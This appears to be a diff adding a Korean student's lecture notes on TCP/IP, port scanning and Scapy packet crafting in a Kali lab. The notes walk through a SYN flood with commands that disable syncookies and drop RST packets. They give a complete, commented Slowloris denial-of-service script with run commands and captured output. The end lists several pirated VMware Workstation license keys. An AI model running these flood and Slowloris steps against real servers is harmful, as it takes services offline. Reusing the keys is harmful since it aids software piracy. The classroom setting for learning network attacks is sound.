@@ -1,0 +1,448 @@
+9시~10시
+
+TCP/IP 사실상 표준 업계가 이 기준으로 product들을 만듬.
+응용 계층
+전송 계층 PORT
+네트워크 계층 IP
+데이터 링크 계층 MAC
+물리 계층
+
+전송할 주소가 붙은 곳이 헤더
+데이터가 포함된 곳이 페이로드이다.
+
+포트번호에 따라 생길 수 있는 응용들이 있다.
+
+응용 계층에서 주로 사용하는 프로토콜은 HTTP,FTP,Telnet
+전송 계층에서 주로 사용하는 프로토콜은 TCP,UDP
+네트워크 계층에서 주로 사용하는 프로토콜은 IP, ICMP, ARP
+데이터링크 계층에서 주로 사용하는 프로토콜은 Ethernet, PPP이다.
+
+일반적으로 많이 쓰는 포트는 피해야함.(웹기반으로 할 때는 80을 쓴다.)
+
+ipconfig해서 나오는 내용들이 어떤 의미를 갖는지 알아두자.
+
+UDP와 TCP의 차이
+
+UDP는 분할되지 않고 전송 오류에 대한 제어가 없음.
+
+헤더에는 주소가 들어감.(출발지와 목적지)
+
+Sequence Number와 Acknowledgment Number가 몇번째에 받았는지 표시하기 위해 들어감.
+CEUAPRSF와 같은 제어 flag가 들어감.
+
+전송 단계에서 만들어진 데이터 구조체를 segment라고 함.(TCP의 경우) datagram이라고 함(UDP의 경우)
+
+하나씩 씌우는 것을 encapsulation, 벗기는 것을 decapsulation
+
+SYN -> SYN/ACK -> ACK인데
+
+서버가 꺼져있으면
+
+SYN -> RST/ACK를 줌.
+
+이 원리로 포트 스캐닝을 할 수 있음.
+
+TCP open Scanning은 로그가 남으므로 지양한다.
+Stealth Scanning.
+
+Half open
+null
+X-mas
+FIN 방식
+
+nmap -s(방식) IP PORT
+
+네트워크 계층의 핵심인 IP 헤드 구조.
+
+Version IPv4면 4 v6면 6
+
+IHL 4까지 늘어날 수 있음
+
+TOS 회선이 복잡할 때 우선 순위를 부여할 때 사용됨
+
+Total Length 전체 길이.
+
+Identification, IP Flags, Fragment Offset 패킷을 분할할 때 사용함.
+
+Identification 라우터를 지날 때 패킷별로 통과할 수 있는 크기가 정해져있음.(Maximum Transmission Unit)
+프로토콜에서 정한 데이터 크기의 최대 범위.
+이더넷에서는 1500바이트로 MTU를 제한함.
+1500미만의 데이터가 네트워크 레이어로 내려왔을 때는 ID와 Fragment Offset은 분할할 필요가 없으니 0이 됨.
+IP Flags의 x D M은
+x: 사용하지 않는다.
+D : Do not fragment
+M : More fragments 라는 의미이다.
+x는 0 D는 1, M은 0 이런 식으로 적용됨.
+
+예를 들어 5900바이트가 들어 왔다면, 1500150015001400으로 나뉜다.
+
+ID	x	D	M	OF(offset)
+1234	0	0	1	0(0부터 1500까지 라는 의미)
+1234	0	0	1	1500(1500부터 3000까지 라는 의미)
+1234	0	0	1	3000(3000부터 4500까지 라는 의미)
+1234	0	0	0	4500(4500~5900)
+
+만약 가운데 1500, 3000을 조작한다면 어떻게 될까? 중첩이 되거나 가운데가 비어있거나 함.
+그러면 다시 요청해야한다. 그동안 이 데이터를 버퍼에 놔둬야하는데,
+이런 요청이 반복되면 부하가 걸린다.
+이러한 공격 기법은 tear drop attack이라고 불린다.
+
+TTL 해당 패킷이 통과할 수 있는 라우터의 갯수임.
+이 데이터가 계속 인터넷을 떠다니는 중 너무 많은 라우터에 들락날락하면 부하가 걸릴 수 있기 때문에 출입하는 라우터 수를 제한함.
+
+상위 계층에서 사용한 프로토콜을 Protocol이라고 정의한다.
+그 다음 나오는 것이 전체 IPHeader Checksum이다.
+그 다음이 주소.(출발지 주소와 목적지 주소)(둘 다 32비트)
+
+fragment offset
+
+
+SCAPY
+파이썬으로 제작된 패킷 조작 프로그램.
+패킷을 캡쳐, 조작, 디코딩 다양한게 전부 가능. 
+scapy.net에서 다운로드 가능.
+
+Kali#2에서 터미널에 scapy 치면 구동됨.(파이썬 명령어 프롬프트 >>> 나옴.)
+어떤 기능을 지원하는지 궁금하면 ls()치면됨.
+지원하는 프로토콜을 확인할 수 있음.
+궁금한게 있으면 (궁금한것)().display() 치면 됨.
+TCP().display() 치면 현재 설정된 TCP의 헤더 정보가 나옴.
+source port, destination port
+sequnce number acknowledgement number.등등..
+ls(궁금한것) 치면 궁금한 것에 대한 정보가 나옴.
+ls(TCP) 치면 TCP의 헤더 정보 구조가 나옴.
+lsc() 치면 사용 가능한 기능이 나옴.
+대소문자 구분함.
+TCP().display()의 내용을 바꾸기 위해서는
+TCP(flags="F").display()와 같이 내용을 변경하면 바뀐다.
+
+tcp=TCP(flags="F)로 바꾸고
+tcp.display()해도 같은 결과가 나온다.
+destination을 바꾸고 싶으면 아래와 같이 한다.
+
+IP().display 는 현재 IP 설정 확인
+ip=IP()
+ip.display도 동일.
+
+현재 IP 헤더에 목적지 주소(dst)를 변경하려고 함.
+IP(dst="192.168.14.128).display()
+ip=IP(dst="192.168.14.128)
+ip.display()
+두 방법 모두 동일
+
+packet = IP()/TCP()
+/는 IP에 TCP를 붙인다는 의미. 앞쪽이 낮은 레벨의 레이어, 뒤쪽이 높은 레벨이어야 함.
+packet.display()
+
+ls()치면 스니핑 기능도 있다. sniff라는 함수를 통해서 할 수 있음.(훔쳐보기)
+
+sniff() -> ctrl+C -> 결과보여줌.
+결과가 없으면 0.
+나온 결과를 보기 위해서는
+sf=sniff()
+sf.display() 하면 보여줌.
+S, SA, A는 각각 Sync, Sync/Ack, Ack임.
+그다음 PA/Raw는 response
+sf=sniff()하고 서버 연결하고 ctrl+c누른 뒤 sf.display()하면 원하는 결과를 볼 수 있음
+
+
+도움말은 
+
+help() -- Scapy 도움말
+help> sniff -- sniff 명령에 도움말
+도움말 빠져나오려면 Q누르면 됨.
+
+sniff(count=10)
+sf=sniff(count=3)
+sf.display 하면 3way handshake만 나옴.
+
+sf[0].show()
+0번째 메세지의 세부 내역을 보고 싶을 때 이렇게 침.
+
+str(sf[0]) 스트링으로 볼 수 있음.
+hexdump(sf[0]) 헥사인코딩된 것으로 볼 수 있음.
+
+이전에는 브라우저에서 쳐서 날라가는 식으로 했었는데
+
+내가 직접 만들 수 있음.
+
+exit()
+scapy
+ip= IP()
+ip.display()로 나갔다 들어와서 리셋 시킨 뒤 설정 정보를 확인.
+ip.dst= "192.168.14.128" //피해자꺼 ip
+ip.display()
+
+tcp = TCP()
+tcp.display() // 여기서 start port를 지정해줄 것임. dport는 어차피 80으로 돌고있으니 바꾸지 않아도 됨. flags도 S니 바꾸지 않아도 됨.
+tcp.sport = RandNum(1024,65535)//1024이후의 65535 사이의 임의 값.
+tcp.display() //쳐보면 <RandNum>으로 바뀌었다.
+syn = ip/tcp // 레이어를 쌓아줌, ip가 tcp보다 밑이어서 앞에 옴.
+syn_ack = sr1(syn) // 응답을 syn_ack에 받겠다는 의미. sr1은 해당 패킷을 전송하고 첫번째 응답이 올 때까지 대기한다는 것.
+syn_ack.display() // SA가 온걸 확인할 수 있음.
+ack = ip/TCP(sport=syn_ack[TCP].dport, flags="A", dport=80, seq = syn_ack[TCP].ack, ack=syn_ack[TCP].seq+1)(다음에 수신하기를 원하는 순서를 넣어줌)
+send(ack)
+
+ack 메세지에 대한 이전 seq에 +1한 값을 줌. 응답번호이다. ACK flags가 설정되었을 때만 유효 다음에 수신하기를 희망하는 순번을 기술, 수신 메세지에 seq+1한 값.
+seq는 내가 관리하는 번호. 이전에서 보낸 ack값이 들어감. 순번
+
+k#2 ->k#1로 sr1(syn) 보내고
+k#1 ->k#2로 syn_ack 보내고
+k#2 ->k#1로 ack를 보낸다.(ack에서 sport는 syn_ack의 dport에서 확인할 수 있다.)
+
+kali#2에서 외부로(outbound)로 rst 패킷이 나가지 못 하도록 drop
+# iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
+공격자 쪽에서 공격에 방해가 되는 패킷이 안나가도록 함.
+3way handshake에서 syn/ack만 안보내면 TCP sync flooding 공격가능.
+
+TCP SYN Flooding 공격
+공격자가 SYN 패킷만 계속해서 전달. Backlog que를 가득 채워서 못받게하는 것.
+SYN 보내고 SYN/ACK 받은 상태을 Half open이라고 함.
+Half open 상태에서 대기하는 것으로 부하시키는 것.
+
+kali#2에서 tcp.flags="S"로 설정한 뒤 send(syn,loop=True)로 보내고(동일 전송 반복)
+kali#1에서 sysctl -a |grep syncookies로 net.ipv4.tcp_syncookies의 현재 상태를 확인하고
+sysctl -w net.ipv4.tcp.syncookies=0으로 전환한다.(테스팅 조건 맞춰 놓기. syncookies를 사용 중지)
+backlog que에 SYN 패킷을 저장. 공격성공!
+
+Slowloris Attack
+- HTTP 응답헤더와 본문이 개행 문자로 구분된다는 구조를 이용한 공격 -> HTTP 요청헤더의 끝이 개행문자로 끝나는 특징을 이용한 공격
+- 헤더와 본문을 구분하는 개행문자가 포함되지 않은 요청
+원래는 맨 마지막의 요청응답의 끝을 알리는 개행문자와 헤더 마지막의 개행문자 2개 있어야함.
+-요청 헤더의 마지막에 들어가는 개행문자를 제공하는 요청을 연속해서 전달->서버는 요청의 끝을 대기하며 연결을 유지.
+서버가 허용한 연결의 최대 수가 있는데 그 지점을 넘어서면 받아들이지 못하게 되는 것. 슬로로리스 어택.
+
+slowloris.py 생성
+
+#! /usr/bin/env python
+
+import sys
+import time
+from scapy.all import * // 라이브러리 3개 호출.
+
+def slowloris(target, num) :
+    print "start connect > {}".format(target)
+    syn = [] //syn을 배열로 잡아놓음.
+    for i in range(num) : 
+        syn.append(IP(dst=target) / TCP(sport=RandNum(1024,65535), dport=80, flags='S'))
+    syn_ack = sr(syn, verbose=0)[0] //sr은 send & recieve임. verbose는 출력되는 양을 조절하는 것.
+
+    ack = []
+    for sa in syn_ack : //syn_ack의 경우에서 1개씩 끄집어내서 sa에 넣어줌. 이런식으로 iterate를 처리함. 
+        payload = "GET /{} HTTP/1.1\r\n".format(str(RandNum(1,num))) +\ // GET 방식으로 요청할 때 사용.
+        "Host: {}\r\n".format(target) +\ //요청을 받아들이는 서버의 주소가 Host에 기술됨.
+        "User-Agent: Mozilla/4.0\r\n" +\ //내가 요청을 보내는 놈이 어떤 종류의 브라우저인지
+        "Content-Length: 42\r\n"//길이가 42라는 얘기, 여기까지가 Payload임. \r\n는 헤더 구분용. 마지막에 \r\n이 한번 더 있어야 하는데 빠져있음.
+
+        ack.append(IP(dst=target) / TCP(sport=sa[1].dport, dport=80, flags="A", seq=sa[1].ack, ack=sa[1].seq+1) / payload)//sa[0]은 IP, sa[1]은 TCP가 옴. /payload로 TCP에 payload를 붙인것.
+
+    answer = sr(ack, verbose=0)[0] // 잡아놓은 bulk packet이 전달되는 것. 알았다. 하고 끝이 나지 않은 요청을 던지는 것.
+    print "{} connection success!\tFail: {}".format(len(answer), num-len(answer))
+    print "Sending data \"X-a: b\\r\\n\".."
+
+    count = 1 //원래는 위의 내용만 보내면 끊어버리는데 여기부터 내용이 못 끊게 만드는것. 
+    while True :
+        print "{} time sending".format(count)
+        ack = []
+        for ans in answer :
+            ack.append(IP(dst=target) / TCP(sport=ans[1].dport, dport=80, flags="PA", seq=ans[1].ack, ack=ans[1].seq) / "X-a: b\r\n")  // "x-a:b\r\n"은 아무 의미 없는 헤더인데,앞에것도 끝이 안나고 이것도 끝이 안나므로 기다림.
+        answer = sr(ack, inter=0.5, verbose=0)[0]//inter=0.5은 인터벌 0.5로 
+        time.sleep(10) // 10초 단위.
+        count += 1 // 조작된 데이터를 1초 단위로 계속 보내는 것.
+
+if __name__ == "__main__" :
+    if len(sys.argv)< 3 :
+        print "Usage: {} <target> <number of connection>".format(sys.argv[0])
+        sys.exit(1)
+    slowloris(sys.argv[1], int(sys.argv[2]))
+
+
+여기서 나오는 PA는 S,SA,A 주고 받고 데이터를 잘 받았냐는 요청 PA 메세지임. 잘받았으면 A 응답이 옴.
+
+slowloris.py 파일을 생성
+root@kali:~# gedit slowloris.py
+
+실행 가능하도록 모드를 수정
+root@kali:~# chmod 755 slowloris.py 
+
+공격
+root@kali:~# ./slowloris.py 피해자IP 50
+
+wire shark에서 TCP로 되있는 것을 아무거나 하나 잡아서 follow -> TCP steam하면
+GET /42 HTTP/1.1
+Host: 192.168.14.128
+User-Agent: Mozilla/4.0
+Content-Length: 42
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+GET /42 HTTP/1.1
+Host: 192.168.14.128
+User-Agent: Mozilla/4.0
+Content-Length: 42
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+X-a: b
+
+
+와 같은 형태가 나옴.
+이것을 Show and data save as -> Hex Dump로 변경하면 0d 0a가 자주 나오는데 이것이 개행 문자이다.
+
+0d 0a 0d 0a가 원래 연속으로 2개 나와야 정상.
+정상 작동하는 것으로 실행하여 확인해볼 것.
+
+KALI#1에서 
+http://localhost/server-status 로 접속
+여기 나오는 R은 request.
+
+scapy >> help() >> layer3 
+layer 3에서 패킷을 주고받는 것.
+
+리눅스 명령어를 모르면 아는 사람과 모르는 사람이 차이 나므로 익숙해지도록 열심히 책 볼 것.
+
+15시~16시
+
+가상머신은 가상의 환경을 호스트에서 에뮬레이트 시켜준다. 이것을 게스트라고 한다.
+BIOS(basic input output system) -> bootloader -> 운영체제 선택. (가상화 나오기전 방식)
+
+안드로이드는 지니 모션과 같은 가상화 소프트웨어로 여러개의 안드로이드를 구동한다.
+
+가상 환경에서 구동되는 운영체제에도 네트워크 카드가 필요한데, 이것은 가상머신 프로그램에서 가상으로 제공해준다.
+
+https://dd00oo.tistory.com/entry/VMWare-12-key 에서 key를 확보하고
+
+5A02H-AU243-TZJ49-GTC7K-3C61N
+GV7R8-03G44-4855Y-7PWEE-NL8DA
+CV79K-8ZD0Q-0807Z-KZQGT-WG8W0
+YY5M8-89W4P-489FQ-XNNNX-Q2AXA
+ZF55H-ARG0N-M89QY-FZPZZ-ZKRUA
+GY7EA-66D53-M859P-5FM7Z-QVH96
+UC3WA-DFE01-M80DQ-AQP7G-PFKEF
+CC15K-AYF01-H897Q-75Y7E-PU89A
+ZA1RA-82EDM-M8E2P-YGYEZ-PC8ED
+VF1N2-8DX1K-M8D0P-6FZG9-NVKZ4
+UV31K-2NG90-089XP-UZP7G-YAHU2
+CA5MH-6YF0K-480WQ-8YM5V-XLKV4
+UZ1WH-0LF5K-M884Z-9PMXE-MYUYA
+FV3TR-4RWEM-4805P-6WYEV-QF292
+FV30R-DWW1H-08E6P-XDQNC-MC2RF
+ZZ10H-4MGEK-489AY-74WNX-MQ2A4
+
+Help -> Enter a License Key 로 들어가서
+
+이 중에 하나를 입력하시면 됩니다.
+
+https://my.vmware.com/web/vmware/info/slug/desktop_end_user_computing/vmware_workstation_pro/12_0
+에서 다운로드
+
+https://www.grc.com/securable.htm
+https://www.grc.com/files/securable.exe 다운로드
+
+ubuntu 16.04 http://releases.ubuntu.com/16.04/ubuntu-16.04.6-desktop-amd64.iso.torrent?_ga=2.204845140.59108437.1557298966-1043453225.1555987931
+Ubuntu 16.04.6 Server http://releases.ubuntu.com/16.04/ubuntu-16.04.6-server-amd64.iso.torrent?_ga=2.201357653.59108437.1557298966-1043453225.1555987931
+
+또는
+
+http://old-releases.ubuntu.com/releases/16.04.0/ubuntu-16.04-desktop-amd64.iso
+http://old-releases.ubuntu.com/releases/16.04.0/ubuntu-16.04-server-amd64.iso
+http://cdimage.ubuntu.com/ubuntu-gnome/releases/16.04/release/ubuntu-gnome-16.04-desktop-amd64.iso
+
+브릿지 모드 = 호스트 머신과 동일한 네트워크 ID를 갖게 되는 것.
+SCSI Controller(스카시 컨트롤러, 하드디스크에 연결하는 방식)
+스카시방식은 20개정도까지 하드웨어를 연결가능, IDE방식은 몇개 연결못함.
+
+가상머신 생성은 컴퓨터 한대 구축한다고 생각하면 됨.
+
+vmdk = virtual machine dis k
+
+CMOS는 Mainboard에 있는 BIOS칩에 있는 시스템이 기본적으로 체크하고 시작하는데, 그것이다.
+
+iface lo inet loopback
